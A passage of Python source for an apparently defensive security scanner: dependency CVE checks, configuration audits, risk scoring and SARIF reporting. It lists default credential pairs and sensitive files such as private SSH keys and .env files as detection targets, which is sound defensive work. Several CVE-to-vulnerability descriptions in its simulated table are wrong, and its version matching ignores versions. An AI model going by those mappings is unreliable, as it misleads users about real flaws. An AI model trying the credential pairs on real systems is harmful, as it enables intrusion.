        dependency_files = {
            "requirements.txt": self._scan_python_dependencies,
            "package.json": self._scan_npm_dependencies,
            "Gemfile": self._scan_ruby_dependencies,
            "pom.xml": self._scan_maven_dependencies,
            "go.mod": self._scan_go_dependencies
        }
        
        for dep_file, scanner_func in dependency_files.items():
            dep_path = target / dep_file if target.is_dir() else target.parent / dep_file
            if dep_path.exists():
                dep_findings = await scanner_func(dep_path)
                findings.extend(dep_findings)
        
        return findings
    
    async def _scan_python_dependencies(self, requirements_file: Path) -> List[SecurityFinding]:
        """Scan Python requirements.txt for vulnerabilities."""
        findings = []
        
        try:
            async with aiofiles.open(requirements_file, 'r') as f:
                content = await f.read()
                
            for line_num, line in enumerate(content.split('\n'), 1):
                line = line.strip()
                if line and not line.startswith('#'):
                    package_findings = self._check_package_vulnerability(line, "python", str(requirements_file), line_num)
                    findings.extend(package_findings)
        
        except Exception as e:
            logger.error(f"Error scanning Python dependencies: {e}")
        
        return findings
    
    async def _scan_npm_dependencies(self, package_file: Path) -> List[SecurityFinding]:
        """Scan Node.js package.json for vulnerabilities."""
        findings = []
        
        try:
            async with aiofiles.open(package_file, 'r') as f:
                content = await f.read()
                package_data = json.loads(content)
            
            dependencies = package_data.get('dependencies', {})
            dev_dependencies = package_data.get('devDependencies', {})
            
            all_deps = {**dependencies, **dev_dependencies}
            
            for package, version in all_deps.items():
                package_line = f"{package}@{version}"
                package_findings = self._check_package_vulnerability(package_line, "npm", str(package_file))
                findings.extend(package_findings)
        
        except Exception as e:
            logger.error(f"Error scanning NPM dependencies: {e}")
        
        return findings
    
    def _check_package_vulnerability(self, package_line: str, ecosystem: str, file_path: str, line_num: int = None) -> List[SecurityFinding]:
        """Check individual package for known vulnerabilities."""
        findings = []
        
        # Simulated vulnerability database check
        # In production, this would integrate with NVD, OSV, or commercial vulnerability databases
        vulnerable_patterns = {
            "python": [
                ("django<2.2.10", "CVE-2020-7471", "XSS vulnerability in Django admin"),
                ("flask<1.1.4", "CVE-2023-30861", "Potential XSS vulnerability"),
                ("requests<2.20.0", "CVE-2018-18074", "Request smuggling vulnerability"),
                ("pyyaml<5.4", "CVE-2020-14343", "Arbitrary code execution")
            ],
            "npm": [
                ("lodash@<4.17.21", "CVE-2021-23337", "Command injection vulnerability"),
                ("express@<4.17.3", "CVE-2022-24999", "Open redirect vulnerability"),
                ("axios@<0.21.1", "CVE-2020-28168", "Server-side request forgery"),
                ("moment@<2.29.2", "CVE-2022-24785", "Path traversal vulnerability")
            ]
        }
        
        patterns = vulnerable_patterns.get(ecosystem, [])
        
        for pattern, cve_id, description in patterns:
            if self._package_matches_vulnerable_pattern(package_line, pattern):
                finding = SecurityFinding(
                    title=f"Vulnerable dependency: {package_line}",
                    description=description,
                    severity=SecuritySeverity.HIGH,
                    vulnerability_type="vulnerable_dependency",
                    cve_id=cve_id,
                    file_path=file_path,
                    line_number=line_num,
                    test_type=SecurityTestType.DEPENDENCY_SCAN,
                    test_tool="Custom Dependency Scanner",
                    scan_target=package_line,
                    evidence=[f"Package: {package_line}", f"CVE: {cve_id}"],
                    remediation_guidance=f"Update to a patched version that addresses {cve_id}",
                    requires_immediate_action=True
                )
                findings.append(finding)
        
        return findings
    
    def _package_matches_vulnerable_pattern(self, package_line: str, pattern: str) -> bool:
        """Check if package matches vulnerable pattern."""
        # Simplified pattern matching - production would use proper semver comparison
        if "@" in pattern:
            pkg_name, version_constraint = pattern.split("@", 1)
            if pkg_name in package_line.lower():
                return True
        elif package_line.lower().startswith(pattern.lower()):
            return True
        
        return False
    
    def calculate_risk_score(self, findings: List[SecurityFinding]) -> float:
        """Calculate overall risk score based on findings."""
        if not findings:
            return 0.0
        
        total_weight = 0
        for finding in findings:
            weight = self.severity_weights.get(finding.severity, 0)
            total_weight += weight
        
        # Normalize to 0-100 scale
        max_possible_weight = len(findings) * self.severity_weights[SecuritySeverity.CRITICAL]
        if max_possible_weight == 0:
            return 0.0
        
        return (total_weight / max_possible_weight) * 100


class SecurityTestEngine:
    """
    Comprehensive security testing engine that extends the existing audit system
    to provide enterprise-grade security testing capabilities.
    """
    
    def __init__(
        self,
        audit_validator: AuditSystemValidator,
        audit_logger: AuditLogger,
        monitoring_system: EnhancedMonitoringSystem,
        real_time_alerting: RealTimeAlerting
    ):
        """Initialize security test engine."""
        # Existing infrastructure integration
        self.audit_validator = audit_validator
        self.audit_logger = audit_logger
        self.monitoring_system = monitoring_system
        self.real_time_alerting = real_time_alerting
        
        # Security testing engines
        self.sast_engine = SASTEngine()
        self.dast_engine = DASTEngine()
        self.vulnerability_scanner = VulnerabilityScanner()
        
        # Test execution tracking
        self.active_tests = {}
        self.test_history = deque(maxlen=1000)
        
        # Configuration
        self.test_config = {
            "max_concurrent_tests": 5,
            "test_timeout_seconds": 3600,  # 1 hour
            "auto_remediation_enabled": False,
            "compliance_frameworks": ["OWASP", "NIST", "DoD"]
        }
        
        # Thread pool for concurrent testing
        self.thread_pool = ThreadPoolExecutor(
            max_workers=8,
            thread_name_prefix="SecurityTest"
        )
        
        # SARIF (Static Analysis Results Interchange Format) support
        self.sarif_version = "2.1.0"
        self.sarif_schema = "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json"
        
        logger.info("Security Test Engine initialized")
    
    async def run_comprehensive_security_assessment(
        self, 
        target_path: str,
        target_url: Optional[str] = None,
        test_types: Optional[List[SecurityTestType]] = None
    ) -> SecurityTestReport:
        """Run comprehensive security assessment."""
        if test_types is None:
            test_types = [
                SecurityTestType.SAST,
                SecurityTestType.DAST,
                SecurityTestType.VULNERABILITY_SCAN,
                SecurityTestType.CONFIGURATION_AUDIT
            ]
        
        report = SecurityTestReport(test_start_time=datetime.now(timezone.utc))
        
        try:
            logger.info(f"Starting comprehensive security assessment for {target_path}")
            
            # Run security tests concurrently
            test_tasks = []
            
            if SecurityTestType.SAST in test_types:
                test_tasks.append(self._run_sast_test(target_path))
            
            if SecurityTestType.DAST in test_types and target_url:
                test_tasks.append(self._run_dast_test(target_url))
            
            if SecurityTestType.VULNERABILITY_SCAN in test_types:
                test_tasks.append(self._run_vulnerability_scan(target_path))
            
            if SecurityTestType.CONFIGURATION_AUDIT in test_types:
                test_tasks.append(self._run_configuration_audit(target_path))
            
            # Execute tests and collect results
            test_results = await asyncio.gather(*test_tasks, return_exceptions=True)
            
            # Process results
            all_findings = []
            for result in test_results:
                if isinstance(result, Exception):
                    logger.error(f"Security test failed: {result}")
                    report.tests_failed += 1
                else:
                    all_findings.extend(result)
                    report.tests_passed += 1
            
            report.tests_executed = len(test_tasks)
            
            # Analyze findings
            await self._analyze_security_findings(all_findings, report)
            
            # Generate recommendations
            await self._generate_security_recommendations(report)
            
            # Create executive summary
            self._create_executive_summary(report)
            
            # Store results
            await self._store_security_test_results(report)
            
            report.test_end_time = datetime.now(timezone.utc)
            report.total_execution_time_seconds = (
                report.test_end_time - report.test_start_time
            ).total_seconds()
            
            logger.info(f"Security assessment completed: {len(all_findings)} findings identified")
            
        except Exception as e:
            logger.error(f"Security assessment failed: {e}")
            report.tests_failed += 1
            
            # Create error finding
            error_finding = SecurityFinding(
                title="Security Assessment Error",
                description=f"Security assessment failed: {e}",
                severity=SecuritySeverity.HIGH,
                test_type=SecurityTestType.VULNERABILITY_SCAN,
                requires_immediate_action=True
            )
            report.security_findings.append(error_finding)
        
        return report
    
    async def _run_sast_test(self, target_path: str) -> List[SecurityFinding]:
        """Run SAST (Static Application Security Testing)."""
        logger.info(f"Running SAST scan on {target_path}")
        start_time = time.time()
        
        try:
            findings = await self.sast_engine.scan_codebase(target_path)
            
            # Log SAST completion
            await self._log_security_test_event("SAST", target_path, len(findings), time.time() - start_time)
            
            return findings
            
        except Exception as e:
            logger.error(f"SAST scan failed: {e}")
            await self._log_security_test_event("SAST", target_path, 0, time.time() - start_time, str(e))
            return []
    
    async def _run_dast_test(self, target_url: str) -> List[SecurityFinding]:
        """Run DAST (Dynamic Application Security Testing)."""
        logger.info(f"Running DAST scan on {target_url}")
        start_time = time.time()
        
        try:
            findings = await self.dast_engine.scan_web_application(target_url)
            
            # Log DAST completion
            await self._log_security_test_event("DAST", target_url, len(findings), time.time() - start_time)
            
            return findings
            
        except Exception as e:
            logger.error(f"DAST scan failed: {e}")
            await self._log_security_test_event("DAST", target_url, 0, time.time() - start_time, str(e))
            return []
    
    async def _run_vulnerability_scan(self, target_path: str) -> List[SecurityFinding]:
        """Run vulnerability assessment."""
        logger.info(f"Running vulnerability scan on {target_path}")
        start_time = time.time()
        
        try:
            findings = await self.vulnerability_scanner.scan_dependencies(target_path)
            
            # Log vulnerability scan completion
            await self._log_security_test_event("VULNERABILITY_SCAN", target_path, len(findings), time.time() - start_time)
            
            return findings
            
        except Exception as e:
            logger.error(f"Vulnerability scan failed: {e}")
            await self._log_security_test_event("VULNERABILITY_SCAN", target_path, 0, time.time() - start_time, str(e))
            return []
    
    async def _run_configuration_audit(self, target_path: str) -> List[SecurityFinding]:
        """Run security configuration audit."""
        logger.info(f"Running configuration audit on {target_path}")
        findings = []
        
        # Check for common security misconfigurations
        config_checks = [
            self._check_debug_settings,
            self._check_default_credentials,
            self._check_sensitive_file_exposure,
            self._check_security_headers_config
        ]
        
        for check in config_checks:
            try:
                check_findings = await check(target_path)
                findings.extend(check_findings)
            except Exception as e:
                logger.debug(f"Configuration check failed: {e}")
        
        return findings
    
    async def _check_debug_settings(self, target_path: str) -> List[SecurityFinding]:
        """Check for debug settings in production."""
        findings = []
        target = Path(target_path)
        
        debug_patterns = [
            (r"DEBUG\s*=\s*True", "Debug mode enabled in production"),
            (r"console\.log\s*\(", "Console logging statements found"),
            (r"print\s*\(.*debug", "Debug print statements found"),
            (r"FLASK_ENV\s*=\s*development", "Flask development mode enabled")
        ]
        
        for pattern, description in debug_patterns:
            if target.is_dir():
                for file_path in target.rglob("*.py"):
                    findings.extend(await self._check_file_for_pattern(file_path, pattern, description))
        
        return findings
    
    async def _check_file_for_pattern(self, file_path: Path, pattern: str, description: str) -> List[SecurityFinding]:
        """Check file for security pattern."""
        findings = []
        
        try:
            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
                
            if re.search(pattern, content, re.IGNORECASE):
                finding = SecurityFinding(
                    title="Security Configuration Issue",
                    description=description,
                    severity=SecuritySeverity.MEDIUM,
                    vulnerability_type="configuration_issue",
                    file_path=str(file_path),
                    test_type=SecurityTestType.CONFIGURATION_AUDIT,
                    test_tool="Configuration Auditor",
                    scan_target=str(file_path),
                    evidence=[f"Pattern found: {pattern}"],
                    remediation_guidance="Review and fix security configuration issues"
                )
                findings.append(finding)
        
        except Exception as e:
            logger.debug(f"Error checking file {file_path}: {e}")
        
        return findings
    
    async def _check_default_credentials(self, target_path: str) -> List[SecurityFinding]:
        """Check for default credentials."""
        findings = []
        
        default_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("user", "user"),
            ("test", "test")
        ]
        
        # This would check configuration files, databases, etc.
        # Simplified implementation for demonstration
        
        return findings
    
    async def _check_sensitive_file_exposure(self, target_path: str) -> List[SecurityFinding]:
        """Check for exposed sensitive files."""
        findings = []
        target = Path(target_path)
        
        sensitive_files = [
            ".env", ".env.local", ".env.production",
            "config.json", "secrets.json",
            "id_rsa", "id_dsa", "id_ecdsa",
            "database.yml", "wp-config.php"
        ]
        
        if target.is_dir():
            for sensitive_file in sensitive_files:
                if (target / sensitive_file).exists():
                    finding = SecurityFinding(
                        title=f"Sensitive File Exposed: {sensitive_file}",
                        description=f"Sensitive file {sensitive_file} found in codebase",
                        severity=SecuritySeverity.HIGH,
                        vulnerability_type="sensitive_file_exposure",
                        file_path=str(target / sensitive_file),
                        test_type=SecurityTestType.CONFIGURATION_AUDIT,
                        test_tool="Configuration Auditor",
                        scan_target=str(target),
                        evidence=[f"File exists: {sensitive_file}"],
                        remediation_guidance="Remove sensitive files from version control and public access"
                    )
                    findings.append(finding)
        
        return findings
    
    async def _check_security_headers_config(self, target_path: str) -> List[SecurityFinding]:
        """Check for security headers configuration."""
        findings = []
        
        # Check web server configuration files
        config_files = ["nginx.conf", "apache2.conf", ".htaccess", "web.config"]
        target = Path(target_path)
        
        required_headers = [
            "X-Frame-Options",
            "X-Content-Type-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        
        if target.is_dir():
            for config_file in config_files:
                config_path = target / config_file
                if config_path.exists():
                    findings.extend(await self._check_security_headers_in_file(config_path, required_headers))
        
        return findings
    
    async def _check_security_headers_in_file(self, file_path: Path, required_headers: List[str]) -> List[SecurityFinding]:
        """Check security headers in configuration file."""
        findings = []
        
        try:
            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            
            missing_headers = []
            for header in required_headers:
                if header not in content:
                    missing_headers.append(header)
            
            if missing_headers:
                finding = SecurityFinding(
                    title="Missing Security Headers",
                    description=f"Security headers not configured: {', '.join(missing_headers)}",
                    severity=SecuritySeverity.MEDIUM,
                    vulnerability_type="missing_security_headers",
                    file_path=str(file_path),
                    test_type=SecurityTestType.CONFIGURATION_AUDIT,
                    test_tool="Configuration Auditor",
                    scan_target=str(file_path),
                    evidence=[f"Missing headers: {missing_headers}"],
                    remediation_guidance="Configure security headers to protect against common attacks"
                )
                findings.append(finding)
        
        except Exception as e:
            logger.debug(f"Error checking security headers in {file_path}: {e}")
        
        return findings
    
    async def _analyze_security_findings(self, findings: List[SecurityFinding], report: SecurityTestReport):
        """Analyze security findings and populate report."""
        report.security_findings = findings
        report.total_findings = len(findings)
        
        # Count by severity
        for finding in findings:
            if finding.severity == SecuritySeverity.CRITICAL:
                report.critical_findings += 1
            elif finding.severity == SecuritySeverity.HIGH:
                report.high_findings += 1
            elif finding.severity == SecuritySeverity.MEDIUM:
                report.medium_findings += 1
            elif finding.severity == SecuritySeverity.LOW:
                report.low_findings += 1
            else:
                report.info_findings += 1
        
        # Count by test type
        for finding in findings:
            if finding.test_type == SecurityTestType.SAST:
                report.sast_findings += 1
            elif finding.test_type == SecurityTestType.DAST:
                report.dast_findings += 1
            elif finding.test_type == SecurityTestType.VULNERABILITY_SCAN:
                report.vulnerability_findings += 1
            elif finding.test_type == SecurityTestType.CONFIGURATION_AUDIT:
                report.configuration_findings += 1
        
        # Calculate risk scores
        report.overall_risk_score = self.vulnerability_scanner.calculate_risk_score(findings)
        
        # Determine security posture rating
        if report.critical_findings > 0:
            report.security_posture_rating = "critical"
        elif report.high_findings > 5:
            report.security_posture_rating = "poor"
        elif report.high_findings > 0 or report.medium_findings > 10:
            report.security_posture_rating = "fair"
        elif report.medium_findings > 0 or report.low_findings > 5:
            report.security_posture_rating = "good"
        else:
            report.security_posture_rating = "excellent"
        
        # Group findings by category
        report.findings_by_category = defaultdict(int)
        for finding in findings:
            report.findings_by_category[finding.vulnerability_type] += 1
    
    async def _generate_security_recommendations(self, report: SecurityTestReport):
        """Generate security recommendations based on findings."""
        # Immediate actions for critical/high findings
        if report.critical_findings > 0:
            report.immediate_actions.append(f"Address {report.critical_findings} critical security vulnerabilities immediately")
        
        if report.high_findings > 0:
            report.immediate_actions.append(f"Remediate {report.high_findings} high-severity vulnerabilities within 24 hours")
        
        # Remediation roadmap
        if report.medium_findings > 0:
            report.remediation_roadmap.append(f"Plan remediation of {report.medium_findings} medium-severity findings")
        
        if report.low_findings > 0:
            report.remediation_roadmap.append(f"Address {report.low_findings} low-severity findings in next sprint")
        
        # General recommendations
        if report.sast_findings > 0:
            report.remediation_roadmap.append("Implement secure coding practices and SAST integration in CI/CD")
        
        if report.dast_findings > 0:
            report.remediation_roadmap.append("Implement runtime application security and WAF protection")
        
        if report.vulnerability_findings > 0:
            report.remediation_roadmap.append("Implement dependency scanning and automated updates")
        
        if report.configuration_findings > 0:
            report.remediation_roadmap.append("Review and harden security configurations")
        
        # Compliance recommendations
        if report.overall_risk_score > 70:
            report.compliance_recommendations.append("Conduct immediate security audit and risk assessment")
        
        if report.overall_risk_score > 40:
            report.compliance_recommendations.append("Implement additional security controls and monitoring")
        
        report.compliance_recommendations.append("Ensure OWASP Top 10 compliance")
        report.compliance_recommendations.append("Verify NIST Cybersecurity Framework alignment")
    
    def _create_executive_summary(self, report: SecurityTestReport):
        """Create executive summary for security report."""
        summary = f"""
SECURITY ASSESSMENT EXECUTIVE SUMMARY

Assessment Period: {report.test_start_time.strftime('%Y-%m-%d %H:%M')} - {report.test_end_time.strftime('%Y-%m-%d %H:%M')}
Total Execution Time: {report.total_execution_time_seconds:.1f} seconds

SECURITY POSTURE: {report.security_posture_rating.upper()}
Overall Risk Score: {report.overall_risk_score:.1f}/100

FINDINGS SUMMARY:
- Critical: {report.critical_findings}
- High: {report.high_findings} 
- Medium: {report.medium_findings}
- Low: {report.low_findings}
- Informational: {report.info_findings}

TESTING COVERAGE:
- SAST Findings: {report.sast_findings}
- DAST Findings: {report.dast_findings}
- Vulnerability Findings: {report.vulnerability_findings}
- Configuration Issues: {report.configuration_findings}

IMMEDIATE ACTIONS: {len(report.immediate_actions)}
REMEDIATION ITEMS: {len(report.remediation_roadmap)}
"""
        
        if report.critical_findings > 0:
            summary += f"\nCRITICAL ALERT: {report.critical_findings} critical vulnerabilities require immediate attention!"
        
        report.executive_summary = summary.strip()
        
        # Set key risks
        report.key_risks = []
        if report.critical_findings > 0:
            report.key_risks.append(f"Critical vulnerabilities: {report.critical_findings}")
        if report.high_findings > 0:
            report.key_risks.append(f"High-severity vulnerabilities: {report.high_findings}")
        if report.overall_risk_score > 70:
            report.key_risks.append("Overall risk score exceeds acceptable threshold")
        
        # Business impact
        if report.security_posture_rating in ["critical", "poor"]:
            report.business_impact = "High - Significant security risks that could lead to data breaches or compliance violations"
        elif report.security_posture_rating == "fair":
            report.business_impact = "Medium - Moderate security risks that should be addressed to prevent escalation"
        else:
            report.business_impact = "Low - Security posture is acceptable with minor improvements needed"
    
    async def _store_security_test_results(self, report: SecurityTestReport):
        """Store security test results in audit system."""
        try:
            # Create audit event for security test execution
            audit_event = AuditEvent(
                event_id=report.report_id,
                timestamp=report.generation_time,
                event_type=AuditEventType.SECURITY_TEST_EXECUTED,
                severity=AuditSeverity.LOW if report.critical_findings == 0 else AuditSeverity.HIGH,
                user_id=None,
                session_id=None,
                resource_type="security_testing",
                action="comprehensive_assessment",
                result="COMPLETED",
                additional_data={
                    "total_findings": report.total_findings,
                    "critical_findings": report.critical_findings,
                    "high_findings": report.high_findings,
                    "security_posture": report.security_posture_rating,
                    "risk_score": report.overall_risk_score,
                    "execution_time": report.total_execution_time_seconds
                }
            )
            
            await self.audit_logger.log_event(audit_event)
            
            # Send alert for critical findings
            if report.critical_findings > 0:
                await self.real_time_alerting.send_alert(
                    alert_type="critical_security_vulnerabilities",
                    severity="critical",
                    message=f"Critical security vulnerabilities detected: {report.critical_findings} findings",
                    context={
                        "report_id": report.report_id,
                        "critical_findings": report.critical_findings,
                        "high_findings": report.high_findings,
                        "risk_score": report.overall_risk_score
                    },
                    priority=AlertPriority.URGENT
                )
            
        except Exception as e:
            logger.error(f"Failed to store security test results: {e}")
    
    async def _log_security_test_event(self, test_type: str, target: str, findings_count: int, execution_time: float, error: str = None):
        """Log security test event."""
        try:
            audit_event = AuditEvent(
                event_id=str(uuid4()),
                timestamp=datetime.now(timezone.utc),
                event_type=AuditEventType.SECURITY_TEST_EXECUTED,
                severity=AuditSeverity.LOW,
                user_id=None,
                session_id=None,
                resource_type="security_testing",
                action=f"{test_type.lower()}_scan",
                result="SUCCESS" if error is None else "FAILED",
                additional_data={
                    "test_type": test_type,
                    "target": target,
                    "findings_count": findings_count,
                    "execution_time_seconds": execution_time,
                    "error": error
                }
            )
            
            await self.audit_logger.log_event(audit_event)
            
        except Exception as e:
            logger.error(f"Failed to log security test event: {e}")
    
    def get_security_metrics(self) -> Dict[str, Any]:
        """Get security testing metrics."""
        return {
            "active_tests": len(self.active_tests),
            "total_tests_executed": len(self.test_history),
            "test_configuration": self.test_config,
            "engines_available": {
                "sast": True,
                "dast": True,
                "vulnerability_scanner": True,
                "configuration_auditor": True
            }
        }
    
    async def health_check(self) -> Dict[str, Any]:
        """Perform health check of security testing system."""
        health_status = {
            "status": "healthy",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "components": {},
            "metrics": self.get_security_metrics()
        }
        
        try:
            # Check audit system integration
            audit_health = await self.audit_validator.health_check()
            health_status["components"]["audit_integration"] = audit_health["status"]
            
            # Check monitoring system integration
            monitoring_health = await self.monitoring_system.health_check()
            health_status["components"]["monitoring_integration"] = monitoring_health["status"]
            
            # Check engines
            health_status["components"]["sast_engine"] = "ready"
            health_status["components"]["dast_engine"] = "ready"
            health_status["components"]["vulnerability_scanner"] = "ready"
            
            # Check thread pool
            health_status["components"]["thread_pool"] = "active" if not self.thread_pool._shutdown else "shutdown"
            
        except Exception as e:
            health_status["status"] = "unhealthy"
            health_status["error"] = str(e)
        
        return health_status
    
    def export_sarif_report(self, findings: List[SecurityFinding], target_path: str) -> Dict[str, Any]:
        """Export findings in SARIF format for tool integration."""
        sarif_report = {
            "$schema": self.sarif_schema,
            "version": self.sarif_version,
            "runs": [
                {
                    "tool": {
                        "driver": {
                            "name": "Security Test Engine",
                            "version": "1.0.0",
                            "informationUri": "https://github.com/company/security-testing-framework",
                            "rules": self._generate_sarif_rules(findings)
                        }
                    },
                    "results": self._convert_findings_to_sarif(findings),
                    "artifacts": self._generate_sarif_artifacts(findings, target_path)
                }
            ]
        }
        
        return sarif_report
    
    def _generate_sarif_rules(self, findings: List[SecurityFinding]) -> List[Dict[str, Any]]:
        """Generate SARIF rules from findings."""
        rules = {}
        
        for finding in findings:
            rule_id = f"{finding.test_type.value}_{finding.vulnerability_type}"
            
            if rule_id not in rules:
                rules[rule_id] = {
                    "id": rule_id,
                    "name": finding.vulnerability_type.replace('_', ' ').title(),
                    "shortDescription": {
                        "text": finding.title
                    },
                    "fullDescription": {
                        "text": finding.description
                    },
                    "help": {
                        "text": finding.remediation_guidance
                    },
                    "properties": {
                        "category": finding.test_type.value,
                        "severity": finding.severity.value,
                        "cwe": finding.cwe_id,
                        "owasp": finding.owasp_category
                    }
                }
        
        return list(rules.values())
    
    def _convert_findings_to_sarif(self, findings: List[SecurityFinding]) -> List[Dict[str, Any]]:
        """Convert security findings to SARIF results format."""
        sarif_results = []
        
        for finding in findings:
            rule_id = f"{finding.test_type.value}_{finding.vulnerability_type}"
            
            sarif_result = {
                "ruleId": rule_id,
                "message": {
                    "text": finding.description
                },
                "level": self._map_severity_to_sarif_level(finding.severity),
                "locations": []
            }
            
            # Add location if available
            if finding.file_path:
                location = {
                    "physicalLocation": {
                        "artifactLocation": {
                            "uri": finding.file_path
                        }
                    }
                }
                
                if finding.line_number:
                    location["physicalLocation"]["region"] = {
                        "startLine": finding.line_number
                    }
                
                sarif_result["locations"].append(location)
            
            # Add additional properties
            sarif_result["properties"] = {
                "findingId": finding.finding_id,
                "detectionTime": finding.detection_time.isoformat(),
                "testTool": finding.test_tool,
                "cvssScore": finding.cvss_score,
                "evidence": finding.evidence,
                "proofOfConcept": finding.proof_of_concept
            }
            
            sarif_results.append(sarif_result)
        
        return sarif_results
    
    def _generate_sarif_artifacts(self, findings: List[SecurityFinding], target_path: str) -> List[Dict[str, Any]]:
        """Generate SARIF artifacts from findings."""
        artifacts = {}
        
        for finding in findings:
            if finding.file_path:
                artifacts[finding.file_path] = {
                    "location": {
                        "uri": finding.file_path
                    },
                    "mimeType": self._get_mime_type(finding.file_path)
                }
        
        return list(artifacts.values())
    
    def _map_severity_to_sarif_level(self, severity: SecuritySeverity) -> str:
        """Map internal severity to SARIF level."""
        mapping = {
            SecuritySeverity.CRITICAL: "error",
            SecuritySeverity.HIGH: "error",
            SecuritySeverity.MEDIUM: "warning",
            SecuritySeverity.LOW: "note",
            SecuritySeverity.INFO: "note"
        }
        return mapping.get(severity, "note")
    
    def _get_mime_type(self, file_path: str) -> str:
        """Get MIME type for file."""
        extension = Path(file_path).suffix.lower()
        mime_types = {
            ".py": "text/x-python",
            ".js": "application/javascript",
            ".ts": "application/typescript",
            ".java": "text/x-java-source",
            ".cs": "text/x-csharp",
            ".cpp": "text/x-c++src",
            ".c": "text/x-csrc",
            ".go": "text/x-go",
            ".php": "application/x-httpd-php",
            ".rb": "application/x-ruby",
            ".yml": "application/x-yaml",
            ".yaml": "application/x-yaml",
            ".json": "application/json",
            ".xml": "application/xml"
        }
        return mime_types.get(extension, "text/plain")
    
    async def generate_comprehensive_report(self, findings: List[SecurityFinding], target_path: str) -> Dict[str, Any]:
        """Generate comprehensive security assessment report."""
        report = {
            "metadata": {
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "target_path": target_path,
                "engine_version": "1.0.0",
                "report_format": "comprehensive"
            },
            "executive_summary": self._generate_executive_summary(findings),
            "vulnerability_metrics": self.vulnerability_scanner.generate_vulnerability_metrics(findings),
            "findings_by_severity": self._group_findings_by_severity(findings),
            "findings_by_type": self._group_findings_by_type(findings),
            "compliance_analysis": self._analyze_compliance_impact(findings),
            "remediation_roadmap": self._generate_remediation_roadmap(findings),
            "detailed_findings": [self._serialize_finding(f) for f in findings],
            "sarif_export": self.export_sarif_report(findings, target_path)
        }
        
        return report
    
    def _generate_executive_summary(self, findings: List[SecurityFinding]) -> Dict[str, Any]:
        """Generate executive summary of security assessment."""
        severity_counts = defaultdict(int)
        for finding in findings:
            severity_counts[finding.severity.value] += 1
        
        risk_score = self.vulnerability_scanner.calculate_risk_score(findings)
        
        # Determine overall security posture
        if severity_counts["critical"] > 0:
            posture = "Critical"
            posture_description = "Immediate action required due to critical vulnerabilities"
        elif severity_counts["high"] > 5:
            posture = "Poor"
            posture_description = "Multiple high-severity vulnerabilities require urgent attention"
        elif severity_counts["high"] > 0 or severity_counts["medium"] > 10:
            posture = "Fair"
            posture_description = "Moderate security risks that should be addressed"
        elif severity_counts["medium"] > 0 or severity_counts["low"] > 5:
            posture = "Good"
            posture_description = "Good security posture with minor improvements needed"
        else:
            posture = "Excellent"
            posture_description = "Strong security posture with minimal issues identified"
        
        return {
            "total_findings": len(findings),
            "risk_score": risk_score,
            "security_posture": posture,
            "posture_description": posture_description,
            "severity_breakdown": dict(severity_counts),
            "key_recommendations": self._get_key_recommendations(findings),
            "business_impact": self._assess_business_impact(findings)
        }
    
    def _group_findings_by_severity(self, findings: List[SecurityFinding]) -> Dict[str, List[Dict]]:
        """Group findings by severity level."""
        grouped = defaultdict(list)
        
        for finding in findings:
            grouped[finding.severity.value].append({
                "title": finding.title,
                "file_path": finding.file_path,
                "vulnerability_type": finding.vulnerability_type,
                "cve_id": finding.cve_id
            })
        
        return dict(grouped)
    
    def _group_findings_by_type(self, findings: List[SecurityFinding]) -> Dict[str, List[Dict]]:
        """Group findings by vulnerability type."""
        grouped = defaultdict(list)
        
        for finding in findings:
            grouped[finding.vulnerability_type].append({
                "title": finding.title,
                "severity": finding.severity.value,
                "file_path": finding.file_path,
                "test_type": finding.test_type.value
            })
        
        return dict(grouped)
    
    def _analyze_compliance_impact(self, findings: List[SecurityFinding]) -> Dict[str, Any]:
        """Analyze compliance impact of findings."""
        owasp_categories = defaultdict(int)
        cwe_categories = defaultdict(int)
        regulatory_violations = []
        
        for finding in findings:
            if finding.owasp_category:
                owasp_categories[finding.owasp_category] += 1
            
            if finding.cwe_id:
                cwe_categories[finding.cwe_id] += 1
            
            # Check for regulatory compliance violations
            if finding.severity in [SecuritySeverity.CRITICAL, SecuritySeverity.HIGH]:
                if finding.vulnerability_type in ["sql_injection", "xss", "authentication_bypass"]:
                    regulatory_violations.append({
                        "regulation": "PCI DSS",
                        "requirement": "6.5.1 - Injection flaws",
                        "finding": finding.title
                    })
                
                if finding.vulnerability_type in ["hardcoded_secrets", "weak_crypto"]:
                    regulatory_violations.append({
                        "regulation": "NIST SP 800-53",
                        "requirement": "SC-13 - Cryptographic Protection",
                        "finding": finding.title
                    })
        
        return {
            "owasp_top_10_coverage": dict(owasp_categories),
            "cwe_categories": dict(cwe_categories),
            "regulatory_violations": regulatory_violations,
            "compliance_score": self._calculate_compliance_score(findings)
        }
    
    def _generate_remediation_roadmap(self, findings: List[SecurityFinding]) -> List[Dict[str, Any]]:
        """Generate prioritized remediation roadmap."""
        # Sort findings by priority (severity + exploitability)
        priority_findings = sorted(
            findings,
            key=lambda f: (
                self.vulnerability_scanner.severity_weights.get(f.severity, 0),
                f.requires_immediate_action,
                bool(f.proof_of_concept)
            ),
            reverse=True
        )
        
        roadmap = []
        for i, finding in enumerate(priority_findings[:20], 1):  # Top 20 items
            roadmap.append({
                "priority": i,
                "title": finding.title,
                "severity": finding.severity.value,
                "file_path": finding.file_path,
                "estimated_effort": self._estimate_remediation_effort(finding),
                "remediation_guidance": finding.remediation_guidance,
                "business_justification": self._get_business_justification(finding)
            })
        
        return roadmap
    
    def _estimate_remediation_effort(self, finding: SecurityFinding) -> str:
        """Estimate remediation effort for finding."""
        effort_mapping = {
            "hardcoded_secrets": "Low (1-2 hours)",
            "missing_security_header": "Low (1 hour)",
            "weak_crypto": "Medium (4-8 hours)",
            "xss": "Medium (2-4 hours)",
            "sql_injection": "High (8-16 hours)",
            "command_injection": "High (8-16 hours)",
            "authentication_bypass": "High (16+ hours)",
            "path_traversal": "Medium (4-8 hours)"
        }
        
        return effort_mapping.get(finding.vulnerability_type, "Medium (4-8 hours)")
    
    def _get_business_justification(self, finding: SecurityFinding) -> str:
        """Get business justification for remediation."""
        if finding.severity == SecuritySeverity.CRITICAL:
            return "Critical risk to business operations and data security"
        elif finding.severity == SecuritySeverity.HIGH:
            return "High risk of data breach or service disruption"
